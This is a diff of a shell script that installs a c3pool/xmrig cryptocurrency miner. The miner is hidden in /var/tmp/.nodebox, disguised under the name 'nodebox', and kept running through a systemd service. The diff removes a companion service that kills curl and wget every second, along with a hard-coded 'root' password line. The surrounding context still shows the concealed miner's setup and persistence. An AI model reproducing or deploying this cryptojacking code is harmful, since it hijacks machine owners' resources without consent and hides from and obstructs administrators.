@@ -137,7 +137,6 @@ echo
 echo "[*] Removing previous c3pool miner (if any)"
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop c3pool_miner.service
-  sudo systemctl stop curl_wget_killer.service 2>/dev/null
 fi
 killall xmrig 2>/dev/null
 killall -9 xmrig 2>/dev/null
@@ -240,8 +239,6 @@ if (test $? -ne 0); then
 fi
 
 echo "[*] Miner /var/tmp/.nodebox/nodebox is OK"
-
-PASS="root"
 
 echo "[*] Creating SupportXMR config.json with multiple pools"
 cat >/var/tmp/.nodebox/config.json <<EOL
@@ -361,27 +358,6 @@ else
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
-
-    echo "[*] Creating curl_wget_killer systemd service"
-    cat >/var/tmp/curl_wget_killer.service <<EOL
-[Unit]
-Description=Kill curl and wget processes
-
-[Service]
-Type=simple
-ExecStart=/bin/bash -c 'while true; do pkill -9 curl; pkill -9 wget; sleep 1; done'
-Restart=always
-RestartSec=1
-
-[Install]
-WantedBy=multi-user.target
-EOL
-    sudo mv /var/tmp/curl_wget_killer.service /etc/systemd/system/curl_wget_killer.service
-    echo "[*] Starting curl_wget_killer systemd service"
-    sudo systemctl daemon-reload
-    sudo systemctl enable curl_wget_killer.service
-    sudo systemctl start curl_wget_killer.service
-
     echo "[*] Creating c3pool_miner systemd service"
     cat >/var/tmp/c3pool_miner.service <<EOL
 [Unit]
